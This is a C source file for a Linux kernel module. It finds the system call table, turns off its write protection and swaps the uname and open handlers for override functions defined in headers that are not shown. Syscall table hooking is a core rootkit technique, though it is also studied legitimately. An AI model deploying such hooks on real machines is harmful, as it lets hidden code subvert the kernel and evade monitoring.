#include <asm/unistd.h>
#include <asm/cacheflush.h>
#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/syscalls.h>
#include <asm/pgtable_types.h>
#include <linux/highmem.h>
#include <linux/fs.h>
#include <linux/sched.h>
#include <linux/moduleparam.h>
#include <linux/unistd.h>
#include <asm/cacheflush.h>
#include <linux/kallsyms.h>
#include "hooks.h"
#include "io.h"

// Syscall Table Reference
// /usr/src/kernels/4.8.15-300.fc25.x86_64/arch/x86/entry/syscalls/syscall_32.tbl
//
// Syscall Table Address
// cat /proc/kallsyms | grep sys_call_table

// Pointer the Kernels system call table.
void **system_call_table_addr;
 
// Make page writeable.
int make_rw(unsigned long address)
{
    unsigned int level;
    pte_t *pte = lookup_address(address, &level);
    if(pte->pte &~_PAGE_RW)
    {
    	printk(KERN_INFO "[SET RW]:\t0x%lx\n", address);
        pte->pte |=_PAGE_RW;
    }
    return 0;
}
 
// Make the page write protected.
int make_ro(unsigned long address)
{
    unsigned int level;
    pte_t *pte = lookup_address(address, &level);
    pte->pte = pte->pte &~_PAGE_RW;
    printk(KERN_INFO "[SET RO]:\t0x%lx\n", address);
    return 0;
}

static int __init entry_point(void)
{
    printk(KERN_INFO "[STATE]:\tLoading module into kernel space...\n");

    kallsyms_on_each_symbol(prsyms_print_symbol, NULL);

    system_call_table_addr = (void*)table_addy;

    // Replace custom syscall with the correct system call name (write,open,etc) to hook.
    original_uname = system_call_table_addr[__NR_uname];
    original_open  = system_call_table_addr[__NR_open];
 
    // Disable page protection
    make_rw((unsigned long)system_call_table_addr);
	
    // Change syscall to our syscall function.
    system_call_table_addr[__NR_uname] = overide_uname;
    system_call_table_addr[__NR_open] = overide_open;

    printk(KERN_INFO "[STATE]:\tModule loaded into kernel space.\n");
    return 0;
}
 
static void __exit exit_point(void)
{
    // Restore original system call.
    system_call_table_addr[__NR_uname] = original_uname;
    system_call_table_addr[__NR_open] = original_open;
 
    // Renable page protection.
    make_ro((unsigned long)system_call_table_addr);

    printk(KERN_INFO "[STATE]:\tModule unloaded.\n");
}
 
module_init(entry_point);
module_exit(exit_point);

MODULE_LICENSE("GPL"); 
